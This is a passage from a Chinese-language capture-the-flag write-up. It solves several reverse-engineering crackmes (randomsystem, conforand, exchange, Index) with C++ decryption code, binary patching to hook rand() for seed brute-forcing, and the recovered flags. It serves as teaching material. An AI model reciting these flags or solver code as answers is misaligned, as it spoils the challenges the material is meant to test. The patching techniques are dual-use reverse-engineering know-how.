        v5 -= (*(DWORD *)(a4 + 4LL * (v7 & 3)) + v7) ^ (v6 + ((v6 >> 5) ^ (16 * v6)));
    }
    *a2 = v5;
    result = a3;
    *a3 = v6;
    return result;
}

int main()
{
    unsigned char buffer[] = {
        0x24, 0x23, 0xCB, 0x8C, 0x1A, 0x74, 0xA7, 0x09,
        0x8D, 0x67, 0x3C, 0xFB, 0x79, 0x3A, 0x08, 0xF6,
        0x1B, 0x24, 0xCC, 0xF1, 0xF2, 0x59, 0xFA, 0x39,
        0xCC, 0xE1, 0xAB, 0xF2, 0x72, 0x9F, 0x18, 0x17};
    srand(0x7e8);
    // 初始化Key
    uint32_t key[4]{};
    for (int i = 0; i < 4; i++)
        key[i] = rand();

    for (int j = 7; j > 0; j--)
        dec(0x9E3779B9, (unsigned int *)(buffer + (j - 1) * 4), (unsigned int *)(buffer + j * 4), (uint32_t)key);

    // 四个字节一组进行翻转
    for (int j = 0; j < 32; j += 4)
    {
        auto tmp = *((char *)buffer + j + 3) | (*((char *)buffer + j + 2) << 8) | (*((char *)buffer + j + 1) << 16) | (*((char *)buffer + j) << 24);
        *(int *)(buffer + j) = tmp;
    }
    printf("%.32s\n", buffer);

    return 0;
}
```

HZNUCTF{ae6-9f57-4b74-b423-98eb}

### randomsystem

第一部分是输入64字节大小的0101二进制数据，然后进行转换到Hex（倒序），再倒序回来拆分半个字节转到ascii字符。

如：0101001001100101第一次函数后是0x65，0x52然后再翻转拆分为ascii字符'5','2','6','5'。

![img](/images/1744633170177-11.png)

根据判断判断出的字符可知要输入的是52 65 56 65 52 65 53 65的二进制数据。

```
0101001001100101010101100110010101010010011001010101001101100101
```

底下的一些加密函数里面有花指令，是基础花指令，这边不做多赘述。

第一部分用固定种子的随机数初始化了一个v18数值列表。

![img](/images/1744633170177-12.png)

然后进行四次加密。

![img](/images/1744633170177-13.png)

Enc1是用随机数初始化的列表进行打乱输入字符串的顺序。

![img](/images/1744633170177-14.png)

Enc2是将输入字符串转存到另一个二维数组。

![img](/images/1744633170177-15.png)

第三个函数是将之前输入转换后的Key存到"Str"中，实际值就是**ReVeReSe**

第四个函数是用一个全局的矩阵乘上输入数据。

![img](/images/1744633170178-16.png)

最后和Key进行循环异或加密。

![img](/images/1744633170178-17.png)

所以解密流程就是这几步的翻转，需要先计算出全局矩阵数据的逆矩阵，这一步用在线网站就可以解得。

Enc1由于是对称的可以直接用原函数，Enc3也可以直接用原函数把矩阵数据改成逆矩阵就是解密。

解密代码：

```cpp
#include <iostream>
#include <windows.h>
#include <string>
#include <time.h>

void Enc1(char *Str, int *RdList)
{
    char v3;   // [esp+D3h] [ebp-1Dh]
    size_t i;  // [esp+DCh] [ebp-14h]
    size_t v5; // [esp+E8h] [ebp-8h]

    v5 = 64;
    for (i = 0;; ++i)
    {
        auto result = v5 >> 1;
        if (i >= v5 >> 1)
            break;
        if (RdList[i] >= 0 && RdList[i] < v5)
        {
            v3 = Str[i];
            Str[i] = Str[v5 - RdList[i] - 1];
            Str[v5 - RdList[i] - 1] = v3;
        }
    }
}

void Enc2(char *a1, char *a2)
{
    int j;  // [esp+D0h] [ebp-20h]
    int i;  // [esp+DCh] [ebp-14h]
    int v4; // [esp+E8h] [ebp-8h]

    v4 = 0;
    for (i = 0; i < 8; ++i)
    {
        for (j = 0; j < 8; ++j)
            *&a1[32 * i + 4 * j] = a2[v4++];
    }
}

unsigned int dword_3FC368[] = {
    0x00000001, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000,
    0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001,
    0x00000000, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000001, 0x00000001, 0x00000000,
    0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,
    0x00000000, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001, 0x00000000,
    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001,
    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000001,
    0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001};

int inv[] = {
    1,-4,1,-2,0,5,-2,3,
    0,3,-1,1,0,-3,1,-2,
    0,-2,1,-1,0,2,-1,2,
    0,0,0,1,0,-1,0,0,
    0,-4,1,-1,1,4,-2,3,
    0,1,0,0,0,0,0,-1,
    0,1,0,0,0,-1,1,-1,
    0,-1,0,0,0,1,0,1,
};

int Enc3(int *a1, char *a2, char *a3)
{
    int result; // eax
    int k;      // [esp+D0h] [ebp-20h]
    int j;      // [esp+DCh] [ebp-14h]
    int i;      // [esp+E8h] [ebp-8h]

    for (i = 0; i < 8; ++i)
    {
        for (j = 0; j < 8; ++j)
        {
            a3[32 * i + 4 * j] = 0;
            for (k = 0; k < 8; ++k)
                a3[32 * i + 4 * j] += *&a2[32 * k + 4 * j] * a1[8 * i + k];
        }
        result = i + 1;
    }
    return result;
}

void Dec2(char *a1, char *a2)
{
    int j;
    int i;
    int v4;

    v4 = 0;
    for (i = 0; i < 8; ++i)
    {
        for (j = 0; j < 8; ++j)
            a2[v4++] = a1[32 * i + 4 * j];
    }
}

unsigned char EncFlag[256] = {
    0x78, 0x01, 0x00, 0x00, 0x64, 0x01, 0x00, 0x00, 0xA9, 0x00, 0x00, 0x00, 0xF5, 0x01, 0x00, 0x00,
    0x15, 0x01, 0x00, 0x00, 0x49, 0x01, 0x00, 0x00, 0x8B, 0x00, 0x00, 0x00, 0x56, 0x01, 0x00, 0x00,
    0x7C, 0x01, 0x00, 0x00, 0x6D, 0x01, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x00,
    0x7D, 0x01, 0x00, 0x00, 0x53, 0x01, 0x00, 0x00, 0x5B, 0x01, 0x00, 0x00, 0x33, 0x01, 0x00, 0x00,
    0x07, 0x01, 0x00, 0x00, 0x67, 0x01, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0xE4, 0x01, 0x00, 0x00,
    0x36, 0x01, 0x00, 0x00, 0x4D, 0x01, 0x00, 0x00, 0x5A, 0x01, 0x00, 0x00, 0x53, 0x01, 0x00, 0x00,
    0x96, 0x00, 0x00, 0x00, 0xC2, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x58, 0x01, 0x00, 0x00,
    0x9E, 0x00, 0x00, 0x00, 0xFA, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00,
    0x9E, 0x00, 0x00, 0x00, 0xAD, 0x00, 0x00, 0x00, 0x98, 0x00, 0x00, 0x00, 0x7B, 0x01, 0x00, 0x00,
    0x9E, 0x00, 0x00, 0x00, 0x24, 0x01, 0x00, 0x00, 0x82, 0x00, 0x00, 0x00, 0x6D, 0x01, 0x00, 0x00,
    0xC5, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0xC5, 0x00, 0x00, 0x00, 0xA1, 0x00, 0x00, 0x00,
    0xC6, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0xCF, 0x00, 0x00, 0x00, 0xF4, 0x00, 0x00, 0x00,
    0xCA, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0xCC, 0x00, 0x00, 0x00, 0xB0, 0x00, 0x00, 0x00,
    0xC1, 0x00, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x9E, 0x00, 0x00, 0x00, 0xB5, 0x00, 0x00, 0x00, 0x91, 0x00, 0x00, 0x00, 0x61, 0x01, 0x00, 0x00,
    0x99, 0x00, 0x00, 0x00, 0x65, 0x01, 0x00, 0x00, 0xF6, 0x00, 0x00, 0x00, 0x97, 0x00, 0x00, 0x00};

int main()
{
    // First: 0101001001100101010101100110010101010010011001010101001101100101
    srand(2025);
    int RdList[0x80]{};
    bool v16 = true;
    int rd{};
    for (int i = 0; i < 32; i++)
    {
        do
        {
            rd = rand() % 32;
            rd &= 0x8000001F;
            v16 = 1;
            for (int j = 0; j < i; j++)
            {
                if (RdList[j] == rd)
                {
                    v16 = 0;
                    break;
                }
            }
        } while (!v16);
        RdList[i] = rd;
    }

    char Key[] = "ReVeReSe";
    int count = 0;
    for (int i = 0; i < 256; i += 4)
    {
        *(DWORD *)(EncFlag + i) ^= Key[count % 8];
        count++;
    }
    unsigned char Buffer_Dec[256]{};

    Enc3((int *)inv, (char *)EncFlag, (char *)Buffer_Dec);
    Dec2((char *)Buffer_Dec, (char *)Buffer_Dec);
    Enc1((char *)Buffer_Dec, RdList);

    printf("HZNUCTF{%.64s}\n", Buffer_Dec);
    return 0;
}
```

HZNUCTF{3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58}

### conforand（非预期）

从srand查看交叉调用，发现是当前时间戳随机，并非伪随机。

![img](/images/1744633170178-18.png)

![img](/images/1744633170178-19.png)

查看rand交叉调用，发现是再init_sbox函数中调用，并且只获取了一次随机数，应该是利用rand的数值参与sbox生成。

![img](/images/1744633170178-20.png)

那么这边的思路就是爆破随机数，但由于是ollvm编译的，代码混乱，使用d810去混淆后也是很混乱，这边就直接不分析加密代码，采取黑盒爆破手段。

接下来是先检验加密对称性，运行发现是会输出加密后的内容。

检验步骤：

1. 随便输入一串字符串
2. 断点rand，修改rand返回值rax寄存器为0。
3. 得到输出加密内容。
4. 再次输入字符串，断点在main的rc4调用处，将传参的字符串patch为刚刚程序输出的加密后字节数据。
5. 断点rand，修改rand返回值rax寄存器为0。
6. 观察输出加密内容是否为原字符串数据。

Patch前：

![img](/images/1744633170178-21.png)

Patch后：

![img](/images/1744633170178-22.png)

发现是对称的，同一个rand值，加密函数也可以用于解密。

![img](/images/1744633170178-23.png)

![img](/images/1744633170178-24.png)

开始Patch原程序流程，用于爆破，将init函数作为hook跳转函数。

将rand调用改成jmp到init函数。

![img](/images/1744633170178-25.png)

init函数头直接改成如下，将0x4068D3地址的数值存到eax，然后再跳转回去，达到一个hook修改rand值结果的效果，所以我们直接加载elf通过修改0x4068D3数值，调用rc4加密来爆破解密密文。

![img](/images/1744633170178-26.png)

这边使用这个库加载elf进行调用call：https://github.com/IchildYu/load-elf （河豚鱼，神）

爆破代码（Key是在原init函数中进行初始化的明文，可以直接找到）：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include "include/load_elf.h"
#include "include/logger.h"
#include "include/breakpoint.h"

int main() 
{
        const char* path = "./conforand";
        void* base = load_elf(path);

        __uint64_t  (*rc4)(unsigned char*, unsigned long long, unsigned char*, unsigned long long) = get_symbol_by_offset(base,0x413170);

        unsigned char key[]="JustDoIt!";

        for(int i=0; i<1000000; i++)
        {
                unsigned char EncData[]={0x83,0x1e,0x9c,0x48,0x7a,0xfa,0xe8,0x88,0x36,0xd5,0x0a,0x08,0xf6,0xa7,0x70,0x0f,0xfd,0x67,0xdd,0xd4,0x3c,0xa7,0xed,0x8d,0x51,0x10,0xce,0x6a,0x9e,0x56,0x57,0x83,0x56,0xe7,0x67,0x9a,0x67,0x22,0x24,0x6e,0xcd,0x2f};

                *(unsigned int*)(0x4068D3) = i;

                rc4(EncData,42,key,9);
                
                if(EncData[0] == 'H' 
                        && EncData[1] == 'Z'
                        && EncData[2] == 'N')
                {
                        printf("Seed:%d\n",i);
                        printf("%.42s\n",EncData);
                        break;
                }
        }
        return 0;
}
```

![img](/images/1744633170178-27.png)

HZNUCTF{489b88-1305-411e-b1f4-88a3070a73}

### exchange

输入的字符串经过unhex、拆分字节，改变顺序。

如：**11**->**0x31 0x31**->**'3' '1' '3' '1'**->**'3' '3' '1' '1'**

是两个字节为一组进行变换的。

然后调用了加密函数，第一个参数传入变换后的输入，第二个参数是**"HZNUCTF{"**字串。

![img](/images/1744633170178-28.png)

主加密函数，发现只走这上面的部分。

![img](/images/1744633170178-29.png)

第一个函数是用**"HZNUCTF{"**字串生成的一串数据，64个整数数据。

第二个函数是将输入数据8个字节为一组进行加密。

加密流程：

1. 4个字节为一组进行翻转
2. 8字节加密
3. 4个字节为一组进行翻转

![img](/images/1744633170178-30.png)

加密可以看出是DES加密算法，是对称的，key就是刚刚生成的64个整数数值的前32个，那么可以知道后32个就是解密用的key，直接copy该函数，解密时用生成的后32个整数key即可解密。

![img](/images/1744633170178-31.png)

解密代码：

```cpp
#include <iostream>
#include <windows.h>
#include <string>
#include <time.h>

unsigned int s1[64] = {
    0x01010400, 0x00000000, 0x00010000, 0x01010404, 0x01010004, 0x00010404, 0x00000004, 0x00010000,
    0x00000400, 0x01010400, 0x01010404, 0x00000400, 0x01000404, 0x01010004, 0x01000000, 0x00000004,
    0x00000404, 0x01000400, 0x01000400, 0x00010400, 0x00010400, 0x01010000, 0x01010000, 0x01000404,
    0x00010004, 0x01000004, 0x01000004, 0x00010004, 0x00000000, 0x00000404, 0x00010404, 0x01000000,
    0x00010000, 0x01010404, 0x00000004, 0x01010000, 0x01010400, 0x01000000, 0x01000000, 0x00000400,
    0x01010004, 0x00010000, 0x00010400, 0x01000004, 0x00000400, 0x00000004, 0x01000404, 0x00010404,
    0x01010404, 0x00010004, 0x01010000, 0x01000404, 0x01000004, 0x00000404, 0x00010404, 0x01010400,
    0x00000404, 0x01000400, 0x01000400, 0x00000000, 0x00010004, 0x00010400, 0x00000000, 0x01010004};
unsigned int s2[64] = {
    0x80108020, 0x80008000, 0x00008000, 0x00108020, 0x00100000, 0x00000020, 0x80100020, 0x80008020,
    0x80000020, 0x80108020, 0x80108000, 0x80000000, 0x80008000, 0x00100000, 0x00000020, 0x80100020,
    0x00108000, 0x00100020, 0x80008020, 0x00000000, 0x80000000, 0x00008000, 0x00108020, 0x80100000,
    0x00100020, 0x80000020, 0x00000000, 0x00108000, 0x00008020, 0x80108000, 0x80100000, 0x00008020,
    0x00000000, 0x00108020, 0x80100020, 0x00100000, 0x80008020, 0x80100000, 0x80108000, 0x00008000,
    0x80100000, 0x80008000, 0x00000020, 0x80108020, 0x00108020, 0x00000020, 0x00008000, 0x80000000,
    0x00008020, 0x80108000, 0x00100000, 0x80000020, 0x00100020, 0x80008020, 0x80000020, 0x00100020,
    0x00108000, 0x00000000, 0x80008000, 0x00008020, 0x80000000, 0x80100020, 0x80108020, 0x00108000};
unsigned int s3[64] = {
    0x00000208, 0x08020200, 0x00000000, 0x08020008, 0x08000200, 0x00000000, 0x00020208, 0x08000200,
    0x00020008, 0x08000008, 0x08000008, 0x00020000, 0x08020208, 0x00020008, 0x08020000, 0x00000208,
    0x08000000, 0x00000008, 0x08020200, 0x00000200, 0x00020200, 0x08020000, 0x08020008, 0x00020208,
    0x08000208, 0x00020200, 0x00020000, 0x08000208, 0x00000008, 0x08020208, 0x00000200, 0x08000000,
    0x08020200, 0x08000000, 0x00020008, 0x00000208, 0x00020000, 0x08020200, 0x08000200, 0x00000000,
    0x00000200, 0x00020008, 0x08020208, 0x08000200, 0x08000008, 0x00000200, 0x00000000, 0x08020008,
    0x08000208, 0x00020000, 0x08000000, 0x08020208, 0x00000008, 0x00020208, 0x00020200, 0x08000008,
    0x08020000, 0x08000208, 0x00000208, 0x08020000, 0x00020208, 0x00000008, 0x08020008, 0x00020200};
unsigned int s4[64] = {
    0x00802001, 0x00002081, 0x00002081, 0x00000080, 0x00802080, 0x00800081, 0x00800001, 0x00002001,
    0x00000000, 0x00802000, 0x00802000, 0x00802081, 0x00000081, 0x00000000, 0x00800080, 0x00800001,
    0x00000001, 0x00002000, 0x00800000, 0x00802001, 0x00000080, 0x00800000, 0x00002001, 0x00002080,
    0x00800081, 0x00000001, 0x00002080, 0x00800080, 0x00002000, 0x00802080, 0x00802081, 0x00000081,
    0x00800080, 0x00800001, 0x00802000, 0x00802081, 0x00000081, 0x00000000, 0x00000000, 0x00802000,
    0x00002080, 0x00800080, 0x00800081, 0x00000001, 0x00802001, 0x00002081, 0x00002081, 0x00000080,
    0x00802081, 0x00000081, 0x00000001, 0x00002000, 0x00800001, 0x00002001, 0x00802080, 0x00800081,
    0x00002001, 0x00002080, 0x00800000, 0x00802001, 0x00000080, 0x00800000, 0x00002000, 0x00802080};
unsigned int s5[64] = {
    0x00000100, 0x02080100, 0x02080000, 0x42000100, 0x00080000, 0x00000100, 0x40000000, 0x02080000,
    0x40080100, 0x00080000, 0x02000100, 0x40080100, 0x42000100, 0x42080000, 0x00080100, 0x40000000,
    0x02000000, 0x40080000, 0x40080000, 0x00000000, 0x40000100, 0x42080100, 0x42080100, 0x02000100,
    0x42080000, 0x40000100, 0x00000000, 0x42000000, 0x02080100, 0x02000000, 0x42000000, 0x00080100,
    0x00080000, 0x42000100, 0x00000100, 0x02000000, 0x40000000, 0x02080000, 0x42000100, 0x40080100,
    0x02000100, 0x40000000, 0x42080000, 0x02080100, 0x40080100, 0x00000100, 0x02000000, 0x42080000,
    0x42080100, 0x00080100, 0x42000000, 0x42080100, 0x02080000, 0x00000000, 0x40080000, 0x42000000,
    0x00080100, 0x02000100, 0x40000100, 0x00080000, 0x00000000, 0x40080000, 0x02080100, 0x40000100};
unsigned int s6[64] = {
    0x20000010, 0x20400000, 0x00004000, 0x20404010, 0x20400000, 0x00000010, 0x20404010, 0x00400000,
    0x20004000, 0x00404010, 0x00400000, 0x20000010, 0x00400010, 0x20004000, 0x20000000, 0x00004010,
    0x00000000, 0x00400010, 0x20004010, 0x00004000, 0x00404000, 0x20004010, 0x00000010, 0x20400010,
    0x20400010, 0x00000000, 0x00404010, 0x20404000, 0x00004010, 0x00404000, 0x20404000, 0x20000000,
    0x20004000, 0x00000010, 0x20400010, 0x00404000, 0x20404010, 0x00400000, 0x00004010, 0x20000010,
    0x00400000, 0x20004000, 0x20000000, 0x00004010, 0x20000010, 0x20404010, 0x00404000, 0x20400000,
    0x00404010, 0x20404000, 0x00000000, 0x20400010, 0x00000010, 0x00004000, 0x20400000, 0x00404010,
    0x00004000, 0x00400010, 0x20004010, 0x00000000, 0x20404000, 0x20000000, 0x00400010, 0x20004010};
unsigned int s7[64] = {
    0x00200000, 0x04200002, 0x04000802, 0x00000000, 0x00000800, 0x04000802, 0x00200802, 0x04200800,
    0x04200802, 0x00200000, 0x00000000, 0x04000002, 0x00000002, 0x04000000, 0x04200002, 0x00000802,
    0x04000800, 0x00200802, 0x00200002, 0x04000800, 0x04000002, 0x04200000, 0x04200800, 0x00200002,
    0x04200000, 0x00000800, 0x00000802, 0x04200802, 0x00200800, 0x00000002, 0x04000000, 0x00200800,
    0x04000000, 0x00200800, 0x00200000, 0x04000802, 0x04000802, 0x04200002, 0x04200002, 0x00000002,
    0x00200002, 0x04000000, 0x04000800, 0x00200000, 0x04200800, 0x00000802, 0x00200802, 0x04200800,
    0x00000802, 0x04000002, 0x04200802, 0x04200000, 0x00200800, 0x00000000, 0x00000002, 0x04200802,
    0x00000000, 0x00200802, 0x04200000, 0x00000800, 0x04000002, 0x04000800, 0x00000800, 0x00200002};
unsigned int s8[64] = {
    0x10001040, 0x00001000, 0x00040000, 0x10041040, 0x10000000, 0x10001040, 0x00000040, 0x10000000,
    0x00040040, 0x10040000, 0x10041040, 0x00041000, 0x10041000, 0x00041040, 0x00001000, 0x00000040,
    0x10040000, 0x10000040, 0x10001000, 0x00001040, 0x00041000, 0x00040040, 0x10040040, 0x10041000,
    0x00001040, 0x00000000, 0x00000000, 0x10040040, 0x10000040, 0x10001000, 0x00041040, 0x00040000,
    0x00041040, 0x00040000, 0x10041000, 0x00001000, 0x00000040, 0x10040040, 0x00001000, 0x00041040,
    0x10001000, 0x00000040, 0x10000040, 0x10040000, 0x10040040, 0x10000000, 0x00040000, 0x10001040,
    0x00000000, 0x10041040, 0x00040040, 0x10000040, 0x10040000, 0x10001000, 0x10001040, 0x00000000,
    0x10041040, 0x00041000, 0x00041000, 0x00001040, 0x00001040, 0x00040040, 0x10000000, 0x10041000};
unsigned short word_7FF65FC70900[8] = {
    0x0080, 0x0040, 0x0020, 0x0010, 0x0008, 0x0004, 0x0002, 0x0001};

unsigned int dword_7FF65FC70910[24] = {
    0x00800000, 0x00400000, 0x00200000, 0x00100000, 0x00080000, 0x00040000, 0x00020000, 0x00010000,
    0x00008000, 0x00004000, 0x00002000, 0x00001000, 0x00000800, 0x00000400, 0x00000200, 0x00000100,
    0x00000080, 0x00000040, 0x00000020, 0x00000010, 0x00000008, 0x00000004, 0x00000002, 0x00000001};
unsigned char byte_7FF65FC70970[56] = {
    0x38, 0x30, 0x28, 0x20, 0x18, 0x10, 0x08, 0x00, 0x39, 0x31, 0x29, 0x21, 0x19, 0x11, 0x09, 0x01,
    0x3A, 0x32, 0x2A, 0x22, 0x1A, 0x12, 0x0A, 0x02, 0x3B, 0x33, 0x2B, 0x23, 0x3E, 0x36, 0x2E, 0x26,
    0x1E, 0x16, 0x0E, 0x06, 0x3D, 0x35, 0x2D, 0x25, 0x1D, 0x15, 0x0D, 0x05, 0x3C, 0x34, 0x2C, 0x24,
    0x1C, 0x14, 0x0C, 0x04, 0x1B, 0x13, 0x0B, 0x03};
unsigned char byte_7FF65FC709A8[16] = {
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10};

void __fastcall des_encrypt(unsigned int *a1, DWORD *a2)
{
    unsigned int left = a1[1];
    unsigned int right = a1[0];

    unsigned int temp = (left ^ (right >> 4)) & 0xF0F0F0F;
    left = temp ^ left;
    right = (temp << 4) ^ right;

    temp = (left ^ (right >> 16)) & 0x0000FFFF;
    left = temp ^ left;
    right = (temp << 16) ^ right;

    temp = (right ^ (left >> 2)) & 0x33333333;
    right = temp ^ right;
    left = (temp << 2) ^ left;

    temp = (right ^ (left >> 8)) & 0x00FF00FF;
    right = temp ^ right;
    left = (((temp << 8) ^ left) >> 31) | (2 * ((temp << 8) ^ left));

    temp = (left ^ right) & 0xAAAAAAAA;
    left = temp ^ left;
    right = ((temp ^ right) >> 31) | (2 * (temp ^ right));

    for (int i = 0; i < 8; i++)
    {
        temp = *a2++ ^ ((left >> 4) | (left << 28));
        unsigned int result1 = s1[(temp >> 24) & 0x3F] |
                               s3[(temp >> 16) & 0x3F] |
                               s5[(temp >> 8) & 0x3F] |
                               s7[temp & 0x3F];
        temp = *a2++ ^ left;

        right ^= s2[(temp >> 24) & 0x3F] |
                 s4[(temp >> 16) & 0x3F] |
                 s6[(temp >> 8) & 0x3F] |
                 s8[temp & 0x3F] |
                 result1;

        temp = *a2++ ^ ((right >> 4) | (right << 28));
        result1 = s1[(temp >> 24) & 0x3F] |
                  s3[(temp >> 16) & 0x3F] |
                  s5[(temp >> 8) & 0x3F] |
                  s7[temp & 0x3F];

        temp = *a2++ ^ right;
        left ^= s2[(temp >> 24) & 0x3F] |
                s4[(temp >> 16) & 0x3F] |
                s6[(temp >> 8) & 0x3F] |
                s8[temp & 0x3F] |
                result1;
    }
    left = (left >> 1) | (left << 31);
    temp = (left ^ right) & 0xAAAAAAAA;
    left = temp ^ left;
    right = ((temp ^ right) >> 1) | ((temp ^ right) << 31);

    temp = (left ^ (right >> 8)) & 0xFF00FF;
    left = temp ^ left;
    right = (temp << 8) ^ right;

    temp = (left ^ (right >> 2)) & 0x33333333;
    left = temp ^ left;
    right = (temp << 2) ^ right;

    temp = (right ^ (left >> 16)) & 0xFFFF;
    right = temp ^ right;
    left = (temp << 16) ^ left;

    temp = (right ^ (left >> 4)) & 0x0F0F0F0F;

    a1[0] = (temp << 4) ^ left;
    a1[1] = temp ^ right;
}

int main()
{
    unsigned int key[64] = {
        0x2C0B3C36, 0x09221A0A, 0x2829051D, 0x09123B0D, 0x2C091B18, 0x0512011F, 0x09292E17, 0x07122920,
        0x090D1703, 0x0514372E, 0x0915123C, 0x27100E27, 0x01050927, 0x25150D29, 0x13151F32, 0x24112618,
        0x03052031, 0x34312B37, 0x13043A05, 0x3C19151B, 0x23063B3E, 0x34293830, 0x03062108, 0x380B3F2A,
        0x260E063D, 0x3009141B, 0x0E223D3D, 0x300B0124, 0x062A1700, 0x11093D14, 0x0E22262B, 0x1208083E,
        0x0E22262B, 0x1208083E, 0x062A1700, 0x11093D14, 0x0E223D3D, 0x300B0124, 0x260E063D, 0x3009141B,
        0x03062108, 0x380B3F2A, 0x23063B3E, 0x34293830, 0x13043A05, 0x3C19151B, 0x03052031, 0x34312B37,
        0x13151F32, 0x24112618, 0x01050927, 0x25150D29, 0x0915123C, 0x27100E27, 0x090D1703, 0x0514372E,
        0x09292E17, 0x07122920, 0x2C091B18, 0x0512011F, 0x2829051D, 0x09123B0D, 0x2C0B3C36, 0x09221A0A};

    unsigned int data[64] = {
        0x00000084, 0x0000008B, 0x00000003, 0x00000022, 0x00000014, 0x000000BE, 0x000000DF, 0x00000075,
        0x000000B3, 0x000000D5, 0x00000076, 0x0000006F, 0x000000CD, 0x0000002A, 0x0000005D, 0x000000D7,
        0x0000004D, 0x000000B2, 0x0000005F, 0x00000006, 0x00000098, 0x0000009D, 0x0000003E, 0x000000A8,
        0x000000F7, 0x00000023, 0x000000F2, 0x0000008B, 0x000000F2, 0x00000054, 0x00000065, 0x0000007A,
        0x00000020, 0x000000C0, 0x00000087, 0x00000055, 0x000000D6, 0x0000003B, 0x00000046, 0x0000003D,
        0x000000F7, 0x000000B2, 0x0000007A, 0x0000009D, 0x000000C2, 0x000000CF, 0x0000001A, 0x000000AE,
        0x00000016, 0x000000C7, 0x00000015, 0x00000030, 0x0000008E, 0x000000FD, 0x0000008F, 0x0000009E,
        0x000000AA, 0x00000039, 0x000000AB, 0x000000FE, 0x00000095, 0x000000A7, 0x0000001F, 0x000000F1};

    unsigned char Enc[64]{};
    for (int i = 0; i < 64; i++)
        Enc[i] = data[i];

    // 四字节一组翻转
    for (int i = 0; i < 64; i += 4)
    {
        auto a = Enc[i], b = Enc[i + 1], c = Enc[i + 2], d = Enc[i + 3];
        Enc[i] = d;
        Enc[i + 1] = c;
        Enc[i + 2] = b;
        Enc[i + 3] = a;
    }
    
    // DES解密（用后32个key）
    for (int i = 0; i < 64; i += 8)
        des_encrypt((unsigned int *)(Enc + i), (DWORD *)(key + 32));

    // 四字节一组翻转
    for (int i = 0; i < 64; i += 4)
    {
        auto a = Enc[i], b = Enc[i + 1], c = Enc[i + 2], d = Enc[i + 3];
        Enc[i] = d;
        Enc[i + 1] = c;
        Enc[i + 2] = b;
        Enc[i + 3] = a;
    }

    printf("HZNUCTF{");
    // 逆向初始字符串变换
    for (int i = 0; i < 64; i += 4)
    {
        std::string tmp1;
        tmp1 += Enc[i];
        tmp1 += Enc[i + 2];

        std::string tmp2;
        tmp2 += Enc[i + 1];
        tmp2 += Enc[i + 3];

        printf("%c", char(std::stoi(tmp1, 0, 16)));
        printf("%c", char(std::stoi(tmp2, 0, 16)));
    }

    printf("}\n");

    return 0;
}
```

HZNUCTF{391ds2b9-9e31-45f8-ba4a-4904a2d8}

### Index

下载附件发现wasm文件开头字节和正常wasm文件不一样，复制修复即可。

左题目附件，右正常wasm文件。

![img](/images/1744633170178-32.png)

使用ghidra进行分析，因为有专门的wasm反编译插件。

通过Exports定位到main函数，以下是经过我重命名后的结果。

![img](/images/1744633170178-33.png)

首先是输入key，然后判断和该处明文是否相等。

然后将Key xor上0x51。

![img](/images/1744633170178-34.png)

![img](/images/1744633170178-35.png)

第一步加密，置了随机数种子0x194，然后用随机数打乱输入的字符串，再转存到另一个Out数组。

![img](/images/1744633170178-36.png)

![img](/images/1744633170179-37.png)

第二步加密（四个字节一组加密）：

1. 用key获取到两个值，然后全局数值iRam0001120++，每次加密都+1，初始值是0。
2. 调用一个函数将0x10ea0处数据异或上0x10da0取下标的对应值。
3. 再将输入字符串异或上0x10ea0对应下标数据以及0x11020对应下标数据，0x11020处数据就是原Key字符串**"TGCTF404"**。

![img](/images/1744633170179-38.png)

![img](/images/1744633170179-39.png)

最后再与0x10fa0处数据进行比对，所以0x10fa0处就是加密后的flag。

![img](/images/1744633170179-40.png)

导出0x10ea0和0x10da0数据，编写以上代码的逆向解密代码即可。

解密代码：

```Cpp
#include <iostream>
#include <Windows.h>

// 0x10da0处数据
unsigned char box[] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,
    0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,
    0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,
    0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,
    0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,
    0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
